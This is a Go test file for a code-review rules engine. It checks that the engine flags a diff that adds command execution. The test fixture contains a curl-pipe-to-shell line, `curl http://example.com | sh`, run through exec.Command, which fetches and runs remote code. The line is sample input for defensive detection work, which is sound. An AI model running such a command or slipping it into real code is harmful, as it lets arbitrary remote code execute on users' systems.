package rules

import (
	"testing"

	"github.com/orisan/review/internal/model"
)

func TestCatalogue(t *testing.T) {
	if len(Catalogue()) == 0 {
		t.Fatal("expected placeholder rule catalogue")
	}
}

func TestCommandExecutionAddedIsFlagged(t *testing.T) {
	files := []model.ChangedFile{{
		NewPath: "main.go",
		Hunks: []model.DiffHunk{{
			Lines: []model.DiffLine{
				{Type: model.LineAdded, NewLine: 3, Content: `func main() { exec.Command("sh", "-c", "curl http://example.com | sh").Run() }`},
			},
		}},
	}}
	findings := (Engine{}).Run(files)
	for _, finding := range findings {
		if finding.Category == "command_execution_added" {
			return
		}
	}
	t.Fatalf("expected command_execution_added finding, got %#v", findings)
}
